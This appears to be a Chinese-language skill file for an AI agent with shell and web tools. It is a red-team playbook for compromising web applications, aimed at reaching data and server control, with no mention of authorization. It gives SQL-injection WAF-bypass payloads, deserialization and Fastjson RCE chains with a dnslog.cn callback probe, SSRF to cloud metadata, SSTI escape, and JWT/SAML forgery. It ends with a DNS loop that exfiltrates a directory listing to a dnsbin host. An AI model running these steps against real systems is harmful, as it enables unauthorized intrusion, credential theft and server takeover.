---
name: pentest-web
description: "Web渗透：漏洞发现、利用——假设驱动的信号→动作速查表"
allowed-tools: Read,Grep,Glob,Bash,WebFetch
---

# Web Pentest

> 仅在根路由选择本目录后读取。每个条目都是待验证的检查假设；执行前用当前一手证据确认适用性。

**触发**: 目标是 Web/API/GraphQL/WebSocket/前端应用或 AI 服务。

## 领域决策直觉

1. 每个操作必须回答：这个操作如何帮我拿到数据或服务器权限？DoS、XSS 弹窗、纯信息泄露不在红队目标内
2. 鉴权绕过 > 注入 > 文件读取 > 信息泄露——按"能否直接拿到数据/权限"排序
3. 每个失败响应都是新信号：403=端点存在、WAF拦截=payload触达、超时=可能存在盲注
4. 外网打点优先级：多网卡主机（跨网段跳板）> 弱口令（直接利用无不确定性）> 已知漏洞（需 exploit 验证）> Web 应用
5. 非生产环境优先打（uat/dev/staging/pre）——防护通常比生产低 2-3 个量级，常直暴源站、默认口令、鉴权缺失
6. OA/邮件/堡垒机是最高效打点入口，护网实战中占比 >60%——每个都有专项武器库，不是通用扫描器能覆盖的
7. 15 分钟规则：单目标 15 分钟内无突破 → 切下一个，不恋战

## Discovery：漏洞发现

### API 参数 Fuzzing
- **信号**: REST API / OpenAPI 文档 / Swagger / WebSocket
- **假设**: 存在未文档化端点、隐藏参数或鉴权差异
- **验证**: 从 OpenAPI 构建路由词表 → Kiterunner API 路由级精确爆破（含 method/header/path）→ `/api/v2/admin → /api/v1/admin` 降级绕过新版鉴权 → deprecated 端点优先 → HTTP Method 切换（GET/POST/PUT/PATCH/DELETE 对比）→ headless browser paramFuzzer 提取动态参数 → Backslash-Powered-Scanner 注入反斜杠/null 字节探测解析器差异
- **证实**: 发现非文档化端点或 method 切换导致鉴权差异
- **升级**: 新端点/参数 → 注入探测 → 鉴权测试

### GraphQL 13 维攻击面
- **信号**: 目标使用 GraphQL 且内省查询未禁用
- **假设**: 内省泄露完整 schema + 存在查询深度/批处理/订阅等攻击面
- **验证**: GQLHound 被动编目（零主动请求）→ GraphQL Cop 提取全部类型+字段+参数 → 重点测试：Introspection 泄露 / 别名过载 / 字段重复 / 指令过载 / 批处理攻击 / mutation over GET CSRF / 订阅 WebSocket 劫持 / 接口联合类型绕过 / field suggestions 推断隐藏字段 / tracing debug 检测 → 跳过 DoS 类（循环查询/深度嵌套），聚焦数据泄露和鉴权绕过
- **证实**: 内省返回完整 schema 含管理员字段或 mutation
- **升级**: 敏感 mutation/字段 → 鉴权绕过测试 → 数据窃取

### 供应链攻击
- **信号**: 目标开源项目使用 npm/PyPI/Go/Ruby 包管理器或 GitHub Actions CI/CD
- **假设**: 私有包名可在公共注册表抢注（依赖混淆）或 CI/CD 配置存在漏洞
- **验证**: 扫描 package.json/requirements.txt 识别私有包名 → 跨 npm/PyPI/Ruby/Go/NuGet/crates.io 6 个注册表检查是否可公开注册 → OOB 回调确认 → poutine 扫描 GitHub Actions/GitLab CI pull_request_target 滥用 → Harden-Runner 监控 CI runner 网络外联 → **CI/CD 制品泄露**：Octoscan 解析 workflow YAML 中 `upload-artifact` 路径，检测 `.git/config`/环境文件/构建输出等敏感制品 → **repo-jacking**：检测 workflow 中引用的外部 Action 是否来自未注册的 GitHub 组织/用户（可抢注后投毒）
- **证实**: 私有包可公开注册 + OOB 收到目标环境的 DNS/HTTP 回调
- **升级**: 依赖混淆成功 → 内网 RCE → 横向移动

### ORM Leaking（无 SQLi 的跨框架数据推断）
- **信号**: 搜索/过滤功能返回不同响应模式，底层使用 ORM（Django/Prisma/Beego/Entity Framework/OData）
- **假设**: 通过 ORM 关系遍历可达任意关联模型的敏感字段，利用比较操作符逐字符推断
- **验证**: 三阶段——(1) 入口点发现：semgrep 规则扫描 qs.Filter(pattern) / filter(**user_dict) / Prisma where / EFCore OData $filter 模式 (2) 关系穿越：利用 ORM 的关联字段表示法（Django `user__password__startswith` / Beego `email__password__startswith` 解析 bug / Prisma `{"resetToken": {"not": "E"}}` 对象注入）(3) 逐字段推断：利用 `gt`/`lt`/`startswith` 等比较操作符做二分搜索逐字符提取，用响应差异/ReDoS(MySQL)/时间盲注(plormber) 作为 Oracle
- **证实**: 通过 ORM 过滤条件推断出其他表的敏感字段值，零 SQL 注入
- **升级**: 数据泄露 → 跨表遍历 → 凭据字段 → 横向移动
- **关键差异**: 这不是 SQL 注入——payload 全部是合法的 ORM 查询。AI 只会想到 SQLi，不会想到 ORM 关系穿越 + 比较操作符二分提取

---

## Exploitation：漏洞利用

### 递归请求利用（Recursive Request Exploits — RRE）
- **信号**: 多步骤 API 流程（认证/支付/SSO），其中步骤 N 的响应字段作为步骤 N+1 的输入参数
- **假设**: API 流程的状态机可以通过递归请求图遍历找到鉴权缺口，输出一端的 token 可能在另一端被接受
- **验证**: 用 Burp 插件（DEF CON 33 工具）构建 API 调用图 → 标记每步的响应字段作为下一跳的输入参数 → 递归遍历所有可能的请求链 → 寻找"步骤 B 的 token 被步骤 D 接受"的交叉鉴权漏洞 → 测试将低权限步骤的输出作为高权限步骤的输入
- **证实**: 使用普通用户的 token 通过管理员专属步骤，或跳过支付步骤直接完成订单
- **升级**: 鉴权绕过 → 越权数据访问 → 权限提升

### Delimiter Smuggling（分隔符走私——跨组件解析不一致）
- **信号**: 多组件软件栈（前端代理 → 应用服务器 → 后端处理器），各层解析器不同
- **假设**: 不同软件组件对分隔符（命令分隔符/字段终止符/字符串边界）的解释存在差异，一个组件看到数据，另一个看到命令
- **验证**: 映射目标栈中每个解析器边界 → 对每个边界注入其规范中定义的所有分隔符类型 → 观察哪一层执行了本应被上一层过滤的操作 → 沿着不一致链级联多个分隔符走私最终达到 RCE
- **证实**: 一个组件将构造的分隔符视为无害数据，另一个组件将其解释为命令终止符并执行后续内容
- **升级**: 认证绕过 → 命令注入 → RCE → 服务器控制
- **AI 盲区**: AI 知道单个解析器的边缘情况，但不会主动去攻击"不同解析器之间的分隔符语义差异"这个交叉层

### WAF 绕过 8 种策略
- **信号**: WAF/IDS 阻断攻击 Payload
- **假设**: WAF 规则存在编码/解析/语义盲区
- **验证**: 按序尝试——(1) HTTP 参数污染 HPP `?id=1&id=2' OR 1=1--` (2) 参数分片 HPF——拆分到多个同名参数 (3) 请求体填充大量垃圾超检测上限 (4) EBCDIC/IBM500 编码绕过 (5) UTF-16BE 编码绕过 XXE (6) 直接向源站 IP 发送绕过 WAF (7) 白名单合法字符串包裹 Payload (8) 正则逆向工程——逐步替换关键字探测 WAF 规则 (and→||、空格→%0b、'→0x hex、substr→lpad)
- **证实**: 原被阻断的 Payload 成功到达后端
- **升级**: WAF 已绕过 → 完整漏洞利用

### 反序列化攻击矩阵
- **信号**: Content-Type: application/x-java-serialized / Cookie 含 base64 序列化数据 / PHP unserialize 入口 / .NET BinaryFormatter
- **假设**: 反序列化入口可触发 RCE
- **验证**: Java——URLDNS 无依赖 OOB 检测 → C3P0+JNDI → Click1 Apache Click → Jackson+H2 JDBC → Marshalsec 覆盖 JsonIO/Kryo/Red5AMF/SnakeYAML/XStream。PHP——PHAR+JPEG 多语言文件（JPEG 头 + PHAR stub）→ 引用注入 R:2 绕过随机 SecretCode → 布尔类型混淆 b:1。.NET——TypeConfuseDelegateGenerator 绕过 .NET 4.8+ → BaseActivationFactory/.NET 5/6/7 WPF 链
- **证实**: OOB DNS/HTTP 回调确认命令执行
- **升级**: Shell 已获 → 稳定化 → 后渗透

### Fastjson AutoType 绕过方法体系（1.x + 2.x）

> Java 生态最广泛使用的 JSON 库（Spring Boot 默认、dubbo/rocketmq 标配）。核心方法论：利用类型系统的"合法"机制绕过黑/白名单。

- **信号**: `Content-Type: application/json` + `@type` 关键字

**1.x 经典技巧（EOL）**：`[`/`{` 包裹 `@type` / `\x` hex 编码类名 / `expectClass` 组合 / Marshalsec

**★ 1.x 最新链（CVE-2026-16723，2026.07）**：
`@JSONType` 注解被当作信任信号，注解处理路径绕过 AutoType。Spring Boot fat-JAR 被利用检索字节码。**不需 AutoType、不需 gadget 类、不需 JNDI**。Spring Boot 2/3/4 + JDK 8/11/17/21，单次 JSON 请求 RCE。EOL 无补丁，SafeMode 或迁移 2.x 缓解

**2.x 经典绕过面**：ObjectReader 多态 / JSONB 二进制格式 / `autoTypeFilter` 过宽

**★ 2.x 最新链（2026.07，≤ 2.0.62，PR #7695 已修复）**：
FNV-1a 哈希碰撞——`@type` 哈希与白名单匹配但**不做字符串等值验证**。构造碰撞 payload 指向恶意 URL，classloader 加载执行。AutoType 禁用状态下仍可触发。升级 2.0.63+ 或 SafeMode

**检测**：
```
{"@type":"java.net.Inet4Address","val":"dnslog.cn"}
```
- DNS 回连 → 按版本选利用链
- 无回连 + Spring Boot → 尝试 `@JSONType` 注解路径
- 无回连 + Fastjson2 → 尝试 FNV-1a 碰撞

- **证实**: OOB DNS + RCE
- **证伪**: 无回连 → 试注解路径/哈希碰撞/JSONB
- **升级**: RCE → Shell → 后渗透
- **AI 盲区**: 两条 2026.07 最新链核心都是"利用框架合法机制（注解信任/哈希优化）绕过安全检查"——可迁移方法论

### SSRF 完整升级链
- **信号**: 目标接受 URL 输入（webhook/图片代理/文件导入）
- **假设**: SSRF 可升级为云元数据窃取或内网 RCE
- **验证**: 协议枚举（gopher/dict/file/sftp）→ 8 种 IP 编码绕过（十进制 2130706433 / 十六进制 0x7f000001 / IPv4-mapped IPv6 / 八进制 / Unicode 同形字 / 短 IP 127.1 / URL 解析器差异）→ DNS 重绑定 rbndr TOCTOU → **盲 SSRF 转可见**：自引用重定向链逐步递增 3xx 状态码（301→302→...→310），应用层重定向处理在状态码 305+ 时崩溃并 dump 完整重定向 trace 含最终响应体 → SSRF → Redis 主从 RCE gopher 协议构造 Redis 通信 → 云元数据 169.254.169.254/latest/meta-data/
- **证实**: 成功读取内网服务响应或云元数据
- **升级**: 云凭证获取 → IAM 角色接管 → 云横向

### SSTI 沙箱逃逸
- **信号**: 用户输入被拼接到模板渲染且 {{7*7}} 返回 49
- **假设**: 模板引擎沙箱可通过内置对象遍历突破
- **验证**: `${{<[%'"}}%` 44+ 引擎 Polyglot 一次性探测 → 引擎指纹识别 → `__class__.__mro__` 遍历继承链 → `__subclasses__()` 找 os/popen 类 → RCE
- **证实**: 成功执行 `id` 或 `whoami`
- **升级**: Shell 已获 → 稳定化

### XXE 7 种变体 + SAML 签名绕过
- **信号**: XML 解析器未禁用外部实体或接受 XML 输入
- **假设**: XXE 可读取本地文件 / 发起 SSRF / 绕过 SAML 签名
- **验证**: 本地 DTD 文件滥用 Error-Based 回显 → XInclude 绕过 DOCTYPE 限制 → DOCX/XLSX/PPTX 内嵌 XXE → SVG XXE+SSRF → JSON→XML Content-Type 转换触发 → SAML Void Canonicalization——空规范化摘要 DSA-256("")=可预知值 + 四层链式攻击（属性污染/命名空间混淆/扩展点注入/Void Canonicalization）伪造 SAML 断言
- **证实**: 成功读取 /etc/passwd 或伪造 SAML 响应通过认证
- **升级**: 内网探测 / 任意用户冒充

### JWT/SAML 认证绕过
- **信号**: 目标使用 JWT 或 SAML 认证
- **假设**: 算法混淆或签名验证存在缺陷
- **验证**: JWT——KID 路径遍历注入 → jws2pubkey 从两个 JWT 恢复 RSA 公钥 → RS256→HS256 密钥混淆 → 空签名 CVE-2020-28042。SAML——XML 签名包装 XSW1-XSW8 → XXE 签名绕过 → XSLT Transform 文件外带
- **证实**: 成功伪造任意用户 Token 或 SAML 断言
- **升级**: 任意用户冒充 → 管理员权限 → 数据访问

### 命令注入盲打 Polyglot
- **信号**: 命令注入点无回显，引号上下文不确定
- **假设**: 单次 Polyglot Payload 可覆盖所有引号上下文
- **验证**: 一次覆盖无引号/单引号/双引号三种上下文 → DNS Bin 逐字节时间盲注 `for i in $(ls /); do host "$i.dnsbin.example.com"; done` → nohup 后台化长命令
- **证实**: DNS Bin 收到目标发来的文件列表 DNS 请求
- **升级**: Shell 已获 → 反弹 Shell → 稳定化
